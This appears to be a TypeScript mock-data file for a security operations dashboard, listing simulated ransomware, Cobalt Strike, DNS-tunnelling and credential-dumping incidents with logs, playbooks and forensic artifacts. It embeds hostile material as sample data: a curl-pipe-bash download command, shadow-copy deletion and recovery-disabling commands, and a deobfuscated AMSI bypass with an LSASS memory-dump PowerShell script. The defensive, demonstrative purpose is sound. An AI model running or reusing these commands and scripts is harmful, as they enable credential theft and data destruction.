import { SecurityIncident, SecurityAlert, SOARPlaybook, ForensicArtifact, MitreTechnique, DetectionRule } from '../types';

export const INITIAL_INCIDENTS: SecurityIncident[] = [
  {
    id: 'INC-9041',
    title: 'ALPHV/BlackCat Ransomware Stager Injection',
    description: 'Suspicious reflective DLL injection detected into svchost.exe with subsequent shadow copy deletion commands and encrypted C2 beaconing.',
    category: 'RANSOMWARE',
    severity: 'CRITICAL',
    status: 'OPEN',
    sourceIp: '185.220.101.42',
    sourceGeo: { country: 'Romania', city: 'Bucharest', lat: 44.4323, lng: 26.1063, flag: '🇷🇴' },
    targetHost: 'SRV-PROD-DB01.corp.internal',
    targetUser: 'NT AUTHORITY\\SYSTEM',
    mitreTactic: 'Execution / Impact',
    mitreTechnique: 'T1055.001 - Process Injection: Dynamic-link Library',
    mitreId: 'T1055.001',
    timestamp: '2026-08-16T19:48:12Z',
    anomalyScore: 97,
    confidenceScore: 99,
    affectedAssets: ['SRV-PROD-DB01', 'STORAGE-SAN-04', 'BACKUP-NAS-01'],
    rawLogs: [
      '2026-08-16 19:48:12.401 [Sysmon-Event-1] Image="C:\\Windows\\System32\\svchost.exe" ProcessId=4892 ParentProcessId=1024 CommandLine="svchost.exe -k netsvcs -p"',
      '2026-08-16 19:48:13.120 [Sysmon-Event-8] CreateRemoteThread: Source="C:\\Temp\\stage2.exe" Target="C:\\Windows\\System32\\svchost.exe" StartAddress=0x7FFF82B10000',
      '2026-08-16 19:48:14.004 [CrowdStrike-EDR] High-Confidence Ransomware behavior: "vssadmin.exe Delete Shadows /All /Quiet" executed by PID 4892',
      '2026-08-16 19:48:15.890 [Suricata-IDS] Outbound encrypted TLS traffic on 185.220.101.42:8443 with self-signed certificate match [BlackCat C2 JARM]'
    ],
    iocs: [
      { type: 'IP', value: '185.220.101.42', reputation: 'MALICIOUS', sourceContext: 'Adversary Command & Control node' },
      { type: 'HASH_SHA256', value: '7c4a8d09ca3762af61e59520943dc26494f8941b', reputation: 'MALICIOUS', sourceContext: 'stage2.exe payload dropper' },
      { type: 'DOMAIN', value: 'dark-telemetry-cdn.online', reputation: 'MALICIOUS', sourceContext: 'Staging distribution domain' },
      { type: 'FILE_PATH', value: 'C:\\Windows\\Temp\\~lock_manifest.dmp', reputation: 'SUSPICIOUS', sourceContext: 'Pre-encryption staging marker' }
    ],
    timelineEvents: [
      { id: 'TL-1', timestamp: '19:45:00Z', phase: 'Initial Access', source: 'Firewall', summary: 'Brute-force SSH attack succeeded on edge jumpbox', details: 'Over 140 authentication failures followed by successful login from 185.220.101.42', severity: 'HIGH' },
      { id: 'TL-2', timestamp: '19:47:10Z', phase: 'Execution', source: 'Sysmon', summary: 'PowerShell dropped stage2.exe binary in C:\\Temp', details: 'Encoded PowerShell script executed from scheduled task cache', severity: 'HIGH' },
      { id: 'TL-3', timestamp: '19:48:12Z', phase: 'Defense Evasion', source: 'CrowdStrike', summary: 'Process injection into svchost.exe (PID 4892)', details: 'Memory region allocated with PAGE_EXECUTE_READWRITE and hijacked thread context', severity: 'CRITICAL' },
      { id: 'TL-4', timestamp: '19:48:14Z', phase: 'Impact', source: 'EDR Alert', summary: 'Shadow copy deletion command executed', details: 'vssadmin.exe invoked to destroy volume recovery snapshots', severity: 'CRITICAL' }
    ],
    remediationHistory: []
  },
  {
    id: 'INC-9042',
    title: 'Cobalt Strike Malleable C2 Beaconing & Pass-the-Hash',
    description: 'Lateral movement attempt across Domain Controllers utilizing cached NTLM hashes and encrypted HTTP POST beacon traffic matching Cobalt Strike signatures.',
    category: 'LATERAL_MOVEMENT',
    severity: 'CRITICAL',
    status: 'INVESTIGATING',
    sourceIp: '194.26.29.112',
    sourceGeo: { country: 'Netherlands', city: 'Amsterdam', lat: 52.3676, lng: 4.9041, flag: '🇳🇱' },
    targetHost: 'DC-CORP-PRIMARY.corp.internal',
    targetUser: 'CORP\\svc_domain_admin',
    mitreTactic: 'Lateral Movement / Credential Access',
    mitreTechnique: 'T1550.002 - Use Alternate Authentication Material: Pass the Hash',
    mitreId: 'T1550.002',
    timestamp: '2026-08-16T19:32:00Z',
    anomalyScore: 92,
    confidenceScore: 95,
    affectedAssets: ['DC-CORP-PRIMARY', 'DC-CORP-BACKUP', 'WS-ADMIN-01'],
    rawLogs: [
      '2026-08-16 19:32:01 [Windows-Security-4624] Successful Logon with NTLM authentication for CORP\\svc_domain_admin from 10.10.40.15',
      '2026-08-16 19:32:05 [Zeek-PCAP] HTTP POST /jquery-3.3.1.min.js to 194.26.29.112:443 with anomalous Base64 encoded cookie header',
      '2026-08-16 19:32:10 [Sysmon-Event-3] rundll32.exe initiated outbound TCP connection to 194.26.29.112:443'
    ],
    iocs: [
      { type: 'IP', value: '194.26.29.112', reputation: 'MALICIOUS', sourceContext: 'Cobalt Strike Team Server' },
      { type: 'DOMAIN', value: 'api.cdn-cloudfare-worker.com', reputation: 'SUSPICIOUS', sourceContext: 'Fronting domain' }
    ],
    timelineEvents: [
      { id: 'TL-1', timestamp: '19:30:15Z', phase: 'Credential Access', source: 'Sysmon', summary: 'LSASS memory accessed by mimikatz-like DLL', details: 'SeDebugPrivilege enabled on WS-ADMIN-01', severity: 'CRITICAL' },
      { id: 'TL-2', timestamp: '19:32:00Z', phase: 'Lateral Movement', source: 'Active Directory', summary: 'Pass-the-Hash authentications against Domain Controller', details: 'Kerberos ticket requested using cached NTLM hash', severity: 'CRITICAL' }
    ],
    remediationHistory: []
  },
  {
    id: 'INC-9043',
    title: 'DNS Tunneling & Base64 Data Exfiltration',
    description: 'Anomalous DNS TXT and NULL record query volume detected sending chunks of encrypted customer databases via staging subdomains.',
    category: 'EXFILTRATION',
    severity: 'HIGH',
    status: 'OPEN',
    sourceIp: '45.154.255.89',
    sourceGeo: { country: 'Seychelles', city: 'Victoria', lat: -4.6191, lng: 55.4513, flag: '🇸🇨' },
    targetHost: 'APP-CUSTOMER-PORTAL.corp.internal',
    targetUser: 'app_service_runner',
    mitreTactic: 'Exfiltration',
    mitreTechnique: 'T1071.004 - Application Layer Protocol: DNS',
    mitreId: 'T1071.004',
    timestamp: '2026-08-16T19:15:40Z',
    anomalyScore: 88,
    confidenceScore: 92,
    affectedAssets: ['APP-CUSTOMER-PORTAL', 'DNS-INTERNAL-01'],
    rawLogs: [
      '2026-08-16 19:15:40 [DNS-Server] High frequency TXT query: "d33a8b29f0c1.stage.tunnel-sync-io.net" from 10.10.20.5',
      '2026-08-16 19:16:02 [PaloAlto-FW] DNS query length 245 bytes exceeds typical protocol threshold (Entropy: 7.84)',
      '2026-08-16 19:16:25 [Zeek-PCAP] Over 8,400 subdomains resolved in 3 minutes to authoritative NS 45.154.255.89'
    ],
    iocs: [
      { type: 'DOMAIN', value: 'tunnel-sync-io.net', reputation: 'MALICIOUS', sourceContext: 'DNS Exfiltration Authoritative Zone' },
      { type: 'IP', value: '45.154.255.89', reputation: 'MALICIOUS', sourceContext: 'Rogue Name Server' }
    ],
    timelineEvents: [
      { id: 'TL-1', timestamp: '19:12:00Z', phase: 'Collection', source: 'Postgres Log', summary: 'Bulk SELECT on customer_identities table', details: 'Unindexed query dumping 45,000 rows', severity: 'HIGH' },
      { id: 'TL-2', timestamp: '19:15:40Z', phase: 'Exfiltration', source: 'DNS Telemetry', summary: 'DNS Tunneling engaged', details: 'Encoded chunks serialized into TXT requests', severity: 'HIGH' }
    ],
    remediationHistory: []
  },
  {
    id: 'INC-9044',
    title: 'Zero-Day Edge Gateway RCE (CVE-2026-1182)',
    description: 'Pre-authentication buffer overflow exploitation against VPN edge appliance leading to root shell drop and firewall rule tampering.',
    category: 'ZERO_DAY_EXPLOIT',
    severity: 'CRITICAL',
    status: 'INVESTIGATING',
    sourceIp: '103.145.13.7',
    sourceGeo: { country: 'Hong Kong', city: 'Central', lat: 22.2819, lng: 114.1581, flag: '🇭🇰' },
    targetHost: 'VPN-GATEWAY-EDGE-01',
    targetUser: 'root',
    mitreTactic: 'Initial Access / Privilege Escalation',
    mitreTechnique: 'T1190 - Exploit Public-Facing Application',
    mitreId: 'T1190',
    timestamp: '2026-08-16T18:50:00Z',
    anomalyScore: 99,
    confidenceScore: 98,
    affectedAssets: ['VPN-GATEWAY-EDGE-01', 'DMZ-SWITCH-01'],
    rawLogs: [
      '2026-08-16 18:50:01 [Nginx-Access] POST /api/v2/auth/saml/sso HTTP/1.1 500 0 PayloadSize=16384 bytes',
      '2026-08-16 18:50:02 [Auditd-Linux] Process spawned: /bin/busybox sh -c "curl -s http://103.145.13.7/stage.sh | bash"',
      '2026-08-16 18:50:05 [Syslog-Kernel] Memory fault in libsaml.so at IP: 0x7f48a91c0b2'
    ],
    iocs: [
      { type: 'IP', value: '103.145.13.7', reputation: 'MALICIOUS', sourceContext: 'Exploit Delivery & Shellcode Drop' },
      { type: 'URL', value: 'http://103.145.13.7/stage.sh', reputation: 'MALICIOUS', sourceContext: 'Linux Rootkit Dropper' }
    ],
    timelineEvents: [
      { id: 'TL-1', timestamp: '18:50:01Z', phase: 'Initial Access', source: 'Web Server', summary: 'Exploit payload sent to SAML endpoint', details: 'Heap overflow trigger in XML parser', severity: 'CRITICAL' },
      { id: 'TL-2', timestamp: '18:50:05Z', phase: 'Execution', source: 'Auditd', summary: 'Root reverse shell established', details: 'Outbound TCP connection on port 4444', severity: 'CRITICAL' }
    ],
    remediationHistory: []
  },
  {
    id: 'INC-9045',
    title: 'LSASS Memory Dumping via MiniDumpWriteDump API',
    description: 'Suspicious elevated process requested full memory dump handle to Local Security Authority Subsystem Service (lsass.exe).',
    category: 'CREDENTIAL_DUMPING',
    severity: 'HIGH',
    status: 'OPEN',
    sourceIp: '10.10.40.88',
    sourceGeo: { country: 'United States', city: 'Ashburn', lat: 39.0438, lng: -77.4874, flag: '🇺🇸' },
    targetHost: 'WS-FINANCE-04.corp.internal',
    targetUser: 'CORP\\j_doe_admin',
    mitreTactic: 'Credential Access',
    mitreTechnique: 'T1003.001 - OS Credential Dumping: LSASS Memory',
    mitreId: 'T1003.001',
    timestamp: '2026-08-16T18:20:11Z',
    anomalyScore: 84,
    confidenceScore: 94,
    affectedAssets: ['WS-FINANCE-04'],
    rawLogs: [
      '2026-08-16 18:20:11 [Sysmon-Event-10] ProcessAccess: Source="C:\\ProgramData\\updater.exe" Target="C:\\Windows\\System32\\lsass.exe" GrantedAccess=0x1FFFFF',
      '2026-08-16 18:20:12 [Windows-Defender] Credential dumping attempt blocked via Attack Surface Reduction (ASR) rule'
    ],
    iocs: [
      { type: 'HASH_SHA256', value: 'a9f24c9876e5d4123b08e5614920c8f1e9447192', reputation: 'MALICIOUS', sourceContext: 'updater.exe disguised payload' }
    ],
    timelineEvents: [
      { id: 'TL-1', timestamp: '18:19:00Z', phase: 'Defense Evasion', source: 'Sysmon', summary: 'updater.exe dropped in ProgramData', details: 'Binary signed with expired certificate', severity: 'MEDIUM' },
      { id: 'TL-2', timestamp: '18:20:11Z', phase: 'Credential Access', source: 'Defender', summary: 'LSASS memory dump attempted', details: 'MiniDumpWriteDump API invoked', severity: 'HIGH' }
    ],
    remediationHistory: []
  }
];

export const INITIAL_ALERTS_FEED: SecurityAlert[] = [
  {
    id: 'ALT-1001',
    timestamp: 'Just now',
    source: 'CrowdStrike EDR',
    severity: 'CRITICAL',
    eventCode: 'EDR-THREAT-994',
    message: 'Process Injection (EarlyBird APC) detected: rundll32.exe -> svchost.exe [PID 4892]',
    sourceIp: '185.220.101.42',
    destinationIp: '10.10.10.50',
    processName: 'svchost.exe',
    user: 'SYSTEM',
    category: 'PROCESS_INJECTION'
  },
  {
    id: 'ALT-1002',
    timestamp: '15s ago',
    source: 'Suricata IDS',
    severity: 'HIGH',
    eventCode: 'ET-MALWARE-20491',
    message: 'ET TROJAN Cobalt Strike Beaconing Pattern over Port 443 with anomalous JARM hash',
    sourceIp: '194.26.29.112',
    destinationIp: '10.10.40.15',
    category: 'COMMAND_AND_CONTROL'
  },
  {
    id: 'ALT-1003',
    timestamp: '32s ago',
    source: 'Firewall PaloAlto',
    severity: 'CRITICAL',
    eventCode: 'PAN-THREAT-DENY',
    message: 'Outbound high-entropy DNS TXT tunneling blocked to authoritative NS 45.154.255.89',
    sourceIp: '10.10.20.5',
    destinationIp: '45.154.255.89',
    category: 'DATA_EXFILTRATION'
  },
  {
    id: 'ALT-1004',
    timestamp: '1m ago',
    source: 'Sysmon',
    severity: 'HIGH',
    eventCode: 'SYSMON-EV-1',
    message: 'Suspicious PowerShell invocation with hidden execution flag and base64 encoded stream',
    sourceIp: '10.10.40.88',
    destinationIp: '10.10.40.88',
    processName: 'powershell.exe',
    user: 'CORP\\j_doe_admin',
    category: 'SUSPICIOUS_SCRIPT'
  },
  {
    id: 'ALT-1005',
    timestamp: '2m ago',
    source: 'AWS CloudTrail',
    severity: 'MEDIUM',
    eventCode: 'AWS-IAM-PASS-ROLE',
    message: 'IAM AssumeRole with AdministratorAccess invoked from unapproved external IP 91.240.118.5',
    sourceIp: '91.240.118.5',
    destinationIp: 'AWS-STS-GLOBAL',
    user: 'dev_iam_role',
    category: 'PRIVILEGE_ESCALATION'
  },
  {
    id: 'ALT-1006',
    timestamp: '3m ago',
    source: 'Azure AD',
    severity: 'HIGH',
    eventCode: 'AAD-STS-RISKY-SIGNIN',
    message: 'Impossible Travel detected: Login from Bucharest (RO) 12 minutes after Tokyo (JP)',
    sourceIp: '185.220.101.42',
    destinationIp: 'login.microsoftonline.com',
    user: 'admin@corp.internal',
    category: 'IDENTITY_THREAT'
  }
];

export const SOAR_PLAYBOOKS: SOARPlaybook[] = [
  {
    id: 'pb-isolate-host',
    name: 'Autonomous Endpoint Network Quarantine',
    description: 'Instantly isolate compromised workstation or server from internal subnet while maintaining EDR telemetry channel.',
    category: 'CONTAINMENT',
    triggerType: 'AUTOMATIC',
    targetSeverity: ['CRITICAL', 'HIGH'],
    enabled: true,
    executionCount: 28,
    lastExecuted: '2026-08-16T19:48:15Z',
    steps: [
      { id: 's1', name: 'Verify EDR Agent Health', action: 'ISOLATE_HOST', paramExample: 'agent_id=CRWD-99412', description: 'Confirm endpoint sensor heartbeat is active.' },
      { id: 's2', name: 'Apply Outbound Block Filter', action: 'ISOLATE_HOST', paramExample: 'firewall_policy=QUARANTINE_STRICT', description: 'Drop all RFC1918 internal traffic and public Internet routing.' },
      { id: 's3', name: 'Notify SOC Slack/Teams Channel', action: 'NOTIFY_TEAM', paramExample: 'webhook=soc_tier3_emergency', description: 'Send high-priority containment alert to active on-call commander.' }
    ]
  },
  {
    id: 'pb-kill-proc-dump-mem',
    name: 'Process Tree Termination & Volatile Memory Dump',
    description: 'Freeze target malicious process tree, generate full user-mode memory crash dump for forensics, and terminate child PIDs.',
    category: 'FORENSICS & REMEDIATION',
    triggerType: 'MANUAL',
    targetSeverity: ['CRITICAL', 'HIGH'],
    enabled: true,
    executionCount: 42,
    lastExecuted: '2026-08-16T19:33:10Z',
    steps: [
      { id: 's1', name: 'Suspend Malicious Process Thread', action: 'KILL_PROCESS', paramExample: 'pid=4892 (svchost.exe)', description: 'Prevent ongoing ransomware encryption loop.' },
      { id: 's2', name: 'Capture Volatile Memory Snapshot', action: 'DUMP_MEMORY', paramExample: 'outpath=\\\\forensics-nas\\dumps\\INC-9041.dmp', description: 'Capture unpacked DLL and encryption keys in RAM.' },
      { id: 's3', name: 'Force Kill Process Tree', action: 'KILL_PROCESS', paramExample: 'force=true', description: 'Terminate all spawned subprocesses.' }
    ]
  },
  {
    id: 'pb-revoke-creds',
    name: 'Compromised Identity Invalidation & Token Revocation',
    description: 'Purge active Kerberos ticket-granting tickets (TGT), invalidate OAuth2 refresh tokens, and enforce password reset with hardware MFA challenge.',
    category: 'IDENTITY_CONTAINMENT',
    triggerType: 'AUTOMATIC',
    targetSeverity: ['CRITICAL', 'HIGH'],
    enabled: true,
    executionCount: 19,
    lastExecuted: '2026-08-16T19:32:05Z',
    steps: [
      { id: 's1', name: 'Revoke Active Azure AD / Okta Sessions', action: 'REVOKE_TOKEN', paramExample: 'user=svc_domain_admin', description: 'Terminate active web and API bearer sessions.' },
      { id: 's2', name: 'Reset Active Directory Password', action: 'REVOKE_TOKEN', paramExample: 'rotate_kerberos_krbtgt=true', description: 'Force credential synchronization.' },
      { id: 's3', name: 'Trigger Step-Up FIDO2 MFA', action: 'NOTIFY_TEAM', paramExample: 'mfa_type=WebAuthn_HardwareKey', description: 'Require hardware security key for next sign-in.' }
    ]
  },
  {
    id: 'pb-block-firewall-ip',
    name: 'Dynamic Edge Firewall IP Blacklist & BGP Sinkhole',
    description: 'Distribute confirmed adversary C2 IPs to border Palo Alto, Fortinet, and AWS Network Firewalls within 1.2 seconds.',
    category: 'NETWORK_BLOCK',
    triggerType: 'AUTOMATIC',
    targetSeverity: ['CRITICAL', 'HIGH', 'MEDIUM'],
    enabled: true,
    executionCount: 84,
    lastExecuted: '2026-08-16T19:48:20Z',
    steps: [
      { id: 's1', name: 'Validate IP Reputation via Threat Intelligence', action: 'BLOCK_IP', paramExample: 'ip=185.220.101.42', description: 'Confirm non-whitelisted public IP.' },
      { id: 's2', name: 'Push Drop Rule to Border Gateways', action: 'BLOCK_IP', paramExample: 'action=DROP_AND_LOG', description: 'Apply ACL rule across edge perimeter.' },
      { id: 's3', name: 'Route to DNS Sinkhole', action: 'BLOCK_IP', paramExample: 'sinkhole=127.0.0.99', description: 'Capture prospective beacons for intelligence telemetry.' }
    ]
  }
];

export const FORENSIC_ARTIFACTS: ForensicArtifact[] = [
  {
    id: 'art-001',
    name: 'stage2_alphv_stager.bin.hex',
    artifactType: 'ELF_BINARY_HEX',
    fileSize: '412.8 KB',
    hashSha256: '7c4a8d09ca3762af61e59520943dc26494f8941b52a94f0612c6a9921b7e4120',
    hashMd5: '9b2c8a14e9f73204918e9a21b3f94012',
    description: 'Dissected second-stage ransomware loader recovered from unmapped heap buffer of svchost.exe (PID 4892).',
    entropy: 7.89,
    sourceHost: 'SRV-PROD-DB01',
    collectedAt: '2026-08-16 19:49:02 UTC',
    hexPreview: `00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............
00000010: b800 0000 0000 0000 4000 0000 0000 0000  ........@.......
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 f800 0000  ................
00000040: 0e1f ba0e 00b4 09cd 21b8 014c cd21 5468  ........!..L.!Th
00000050: 6973 2070 726f 6772 616d 2063 616e 6e6f  is program canno
00000060: 7420 6265 2072 756e 2069 6e20 444f 5320  t be run in DOS 
00000070: 6d6f 6465 2e0d 0d0a 2400 0000 0000 0000  mode....$.......
00000080: 5045 0000 6486 0600 2a1b b466 0000 0000  PE..d...*..f....
00000090: 0000 0000 f000 2200 0b02 0e00 0040 0000  ......"......@..
000000a0: 0050 0000 0010 0000 a012 0000 0010 0000  .P..............
000000b0: 0000 4000 0010 0000 0002 0000 0600 0000  ..@.............
000000c0: 4883 ec28 4889 5c24 2048 8974 2428 5748  H..(H.\\$ H.t$(WH
000000d0: 83ec 3048 8b05 a932 0100 4885 c074 1548  ..0H...2..H..t.H
000000e0: 8b40 2048 85c0 740c ff15 f021 0100 4883  .@ H..t....!..H.
000000f0: c430 5f5e 5bc3 cc48 895c 2408 5748 83ec  .0_^[..H.\\$.WH..`,
    extractedStrings: [
      'VirtualAllocEx',
      'WriteProcessMemory',
      'CreateRemoteThread',
      'NtUnmapViewOfSection',
      'vssadmin.exe Delete Shadows /All /Quiet',
      'bcdedit /set {default} recoveryenabled No',
      '185.220.101.42:8443',
      'https://dark-telemetry-cdn.online/v2/key',
      '.alphv_encrypted',
      'RECOVERY_INSTRUCTIONS.html'
    ],
    decompiledCode: `// Decompiled with SentinelX Ghidra AI Engine v4.2
int __fastcall sub_1400012A0(LPCSTR lpModuleName) {
    HMODULE hModule = LoadLibraryA("ntdll.dll");
    pfnNtAllocateVirtualMemory pAlloc = (pfnNtAllocateVirtualMemory)GetProcAddress(hModule, "NtAllocateVirtualMemory");
    
    PVOID BaseAddress = NULL;
    SIZE_T RegionSize = 0x80000;
    // Allocate RWX memory for payload decryption
    NTSTATUS status = pAlloc(GetCurrentProcess(), &BaseAddress, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // Decrypt AES-256 stager key
    unsigned char xorKey[] = { 0x7C, 0x4A, 0x8D, 0x09 };
    for (int i = 0; i < 0x2000; i++) {
        ((unsigned char*)BaseAddress)[i] ^= xorKey[i % 4];
    }
    
    // Invoke reflective thread
    HANDLE hThread = CreateRemoteThread(GetCurrentProcess(), NULL, 0, (LPTHREAD_START_ROUTINE)BaseAddress, NULL, 0, NULL);
    return (int)status;
}`,
    behavioralTraces: [
      { category: 'PROCESS_EXEC', action: 'CreateRemoteThread', target: 'svchost.exe (PID 4892)', risk: 'HIGH' },
      { category: 'FILE_SYSTEM', action: 'WriteFile', target: 'C:\\Windows\\Temp\\payload.dll', risk: 'HIGH' },
      { category: 'REGISTRY', action: 'RegSetValueEx', target: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WinDefHost', risk: 'HIGH' },
      { category: 'NETWORK', action: 'ConnectSocket', target: '185.220.101.42:8443 (TLS)', risk: 'HIGH' }
    ],
    iocs: [
      { type: 'HASH_SHA256', value: '7c4a8d09ca3762af61e59520943dc26494f8941b', reputation: 'MALICIOUS', sourceContext: 'Stage2 Dropper' },
      { type: 'IP', value: '185.220.101.42', reputation: 'MALICIOUS', sourceContext: 'C2 Endpoint' }
    ],
    yaraMatches: ['Ransomware_BlackCat_Stager_v3', 'Generic_Process_Injection_EarlyBird', 'High_Entropy_Packed_PE']
  },
  {
    id: 'art-002',
    name: 'network_stream_exfil_c2.pcap',
    artifactType: 'PCAP_DUMP',
    fileSize: '1.8 MB',
    hashSha256: '3e419b8821ab07e1c9d240e8b150937a284c1f92e38901248ab120489c72e104',
    hashMd5: '124f8e91024bc01928374a1029c8e410',
    description: 'Packet capture stream containing suspicious high-volume DNS tunneling and encrypted Cobalt Strike HTTP POST beacons.',
    entropy: 6.94,
    sourceHost: 'APP-CUSTOMER-PORTAL',
    collectedAt: '2026-08-16 19:16:30 UTC',
    hexPreview: `00000000: d4c3 b2a1 0200 0400 0000 0000 0000 0000  ................
00000010: ffff 0000 0100 0000 5e3a a068 0008 0900  ........^:.h....
00000020: 3c00 0000 3c00 0000 000c 298f 4410 0050  <...<...:).D..P
00000030: 56c0 0008 0800 4500 0028 3b94 4000 4006  V.....E..(;.@.@.
00000040: c452 0a0a 1405 2d9a ff59 c104 0035 0014  .R....-..Y...5..
00000050: 0000 0000 0000 8002 7210 f4a0 0000 0204  ........r.......
00000060: 05b4 0101 0402 0103 0307 504f 5354 202f  ..........POST /
00000070: 6170 692f 7631 2f73 796e 6320 4854 5450  api/v1/sync HTTP
00000080: 2f31 2e31 0d0a 486f 7374 3a20 7475 6e6e  /1.1..Host: tunn
00000090: 656c 2d73 796e 632d 696f 2e6e 6574 0d0a  el-sync-io.net..
000000a0: 5573 6572 2d41 6765 6e74 3a20 4d6f 7a69  User-Agent: Mozi
000000b0: 6c6c 612f 352e 3020 2857 696e 646f 7773  lla/5.0 (Windows`,
    extractedStrings: [
      'POST /api/v1/sync HTTP/1.1',
      'Host: tunnel-sync-io.net',
      'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      'Cookie: session_token=ZXhoaWJpdF9leGZpbHRyYXRpb25fZGF0YV9jaHVuaw==',
      'DNS TXT Query: a19f0293b.tunnel-sync-io.net',
      'DNS TXT Query: c48820491.tunnel-sync-io.net',
      'TLS Certificate CN: *.cdn-cloudfare-worker.com'
    ],
    behavioralTraces: [
      { category: 'NETWORK', action: 'DNS Query (TXT)', target: 'tunnel-sync-io.net (8,420 queries)', risk: 'HIGH' },
      { category: 'NETWORK', action: 'HTTP POST Beacon', target: '194.26.29.112:443', risk: 'HIGH' }
    ],
    iocs: [
      { type: 'DOMAIN', value: 'tunnel-sync-io.net', reputation: 'MALICIOUS', sourceContext: 'Exfiltration Host' },
      { type: 'IP', value: '45.154.255.89', reputation: 'MALICIOUS', sourceContext: 'Adversary DNS Server' }
    ],
    yaraMatches: ['Network_DNS_Tunneling_Exfil', 'CobaltStrike_Malleable_JQuery_Profile']
  },
  {
    id: 'art-003',
    name: 'invoke_obfuscated_mimikatz.ps1',
    artifactType: 'POWERSHELL_PAYLOAD',
    fileSize: '84.2 KB',
    hashSha256: '918e7c2a10b48c901e823f441098234a01928374e120498b7c4a1029e84b1230',
    hashMd5: 'f892341029c8e104928b7c4a10293847',
    description: 'Multi-layer obfuscated PowerShell script invoking AMSI bypass and dumping SAM hashes directly to memory stream.',
    entropy: 6.72,
    sourceHost: 'WS-FINANCE-04',
    collectedAt: '2026-08-16 18:22:00 UTC',
    hexPreview: `00000000: 2465 6e63 203d 2022 4a41 4247 4147 6341  $enc = "JABGAGcA
00000010: 6277 4275 4148 4941 6351 4276 4147 6341  bwBuAHIAcQBvAGcA
00000020: 5951 4273 4148 5141 4941 4242 4147 3041  YQBsAHQAIABBAH0A
00000030: 5577 424a 4147 3041 5951 4273 4147 7741  UwBJAG0AYQBsAGwA
00000040: 6151 4279 4148 4d41 4c67 4230 4148 6b41  aQByAHMALgB0AHkA
00000050: 6377 426c 4147 3041 4941 4231 4147 6341  cwBlAG0AIAB1AGcA
00000060: 5977 427a 4147 3841 6277 4276 4147 3441  YwBzAAG8AbwBvAG4A`,
    decompiledCode: `# Deobfuscated Layer 2 PowerShell Script
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

Write-Host "[*] AMSI Memory Patch applied successfully."
$MiniDump = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-ProcAddress dbgcore.dll MiniDumpWriteDump),
    [Func[IntPtr, UInt32, IntPtr, UInt32, IntPtr, IntPtr, IntPtr, Boolean]]
)

$LsassPID = (Get-Process lsass).Id
$hProcess = [Kernel32]::OpenProcess(0x1F0FFF, $false, $LsassPID)
$FileStream = New-Object IO.FileStream("C:\\Windows\\Temp\\lsass.dmp", [IO.FileMode]::Create)
$MiniDump.Invoke($hProcess, $LsassPID, $FileStream.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
$FileStream.Close()
Write-Host "[+] Dump written to C:\\Windows\\Temp\\lsass.dmp"`,
    extractedStrings: [
      'AmsiUtils',
      'amsiInitFailed',
      'MiniDumpWriteDump',
      'dbgcore.dll',
      'lsass.exe',
      'OpenProcess (0x1F0FFF)',
      'Invoke-Mimikatz'
    ],
    behavioralTraces: [
      { category: 'PROCESS_EXEC', action: 'AMSI Bypass in Memory', target: 'amsi.dll [amsiInitFailed=true]', risk: 'HIGH' },
      { category: 'PROCESS_EXEC', action: 'OpenProcess on LSASS', target: 'lsass.exe (Access: 0x1F0FFF)', risk: 'HIGH' },
      { category: 'FILE_SYSTEM', action: 'CreateFile', target: 'C:\\Windows\\Temp\\lsass.dmp', risk: 'HIGH' }
    ],
    iocs: [
      { type: 'FILE_PATH', value: 'C:\\Windows\\Temp\\lsass.dmp', reputation: 'SUSPICIOUS', sourceContext: 'Memory Dump' }
    ],
    yaraMatches: ['PowerShell_AMSI_Bypass_Generic', 'HackTool_Mimikatz_Memory_Dumper']
  }
];

export const MITRE_MATRIX: MitreTechnique[] = [
  { id: 'T1190', tactic: 'Initial Access', name: 'Exploit Public-Facing Application', description: 'Adversary leverages zero-day vulnerability in web or edge gateway.', activeDetections: 4, incidentCount: 2, riskScore: 98 },
  { id: 'T1078', tactic: 'Initial Access', name: 'Valid Accounts', description: 'Obtaining and using credentials of existing accounts to gain initial access.', activeDetections: 12, incidentCount: 3, riskScore: 85 },
  { id: 'T1059.001', tactic: 'Execution', name: 'Command & Scripting Interpreter: PowerShell', description: 'Adversaries abuse PowerShell commands and scripts for execution.', activeDetections: 28, incidentCount: 6, riskScore: 92 },
  { id: 'T1053', tactic: 'Execution', name: 'Scheduled Task/Job', description: 'Abusing task scheduling to execute programs at system startup or periodically.', activeDetections: 15, incidentCount: 4, riskScore: 78 },
  { id: 'T1547', tactic: 'Persistence', name: 'Boot or Logon Autostart Execution', description: 'Configuring settings to automatically execute a program during boot or logon.', activeDetections: 9, incidentCount: 2, riskScore: 80 },
  { id: 'T1055.001', tactic: 'Defense Evasion', name: 'Process Injection: Dynamic-link Library', description: 'Injecting malicious DLL into unmapped memory of trusted processes.', activeDetections: 18, incidentCount: 5, riskScore: 99 },
  { id: 'T1027', tactic: 'Defense Evasion', name: 'Obfuscated Files or Information', description: 'Encrypting or encoding payloads to hide indicators from security tooling.', activeDetections: 34, incidentCount: 8, riskScore: 90 },
  { id: 'T1003.001', tactic: 'Credential Access', name: 'OS Credential Dumping: LSASS Memory', description: 'Attempting to access and dump credentials from the LSASS process.', activeDetections: 22, incidentCount: 4, riskScore: 95 },
  { id: 'T1550.002', tactic: 'Lateral Movement', name: 'Use Alternate Authentication: Pass the Hash', description: 'Authenticating to remote services using NTLM hashes without plaintext.', activeDetections: 11, incidentCount: 3, riskScore: 93 },
  { id: 'T1071.001', tactic: 'Command and Control', name: 'Application Layer Protocol: Web Protocols', description: 'Communicating using HTTP/HTTPS to blend in with normal web traffic.', activeDetections: 45, incidentCount: 11, riskScore: 91 },
  { id: 'T1071.004', tactic: 'Exfiltration', name: 'Application Layer Protocol: DNS', description: 'Tunneling stolen confidential data chunks out via recursive DNS queries.', activeDetections: 8, incidentCount: 2, riskScore: 89 },
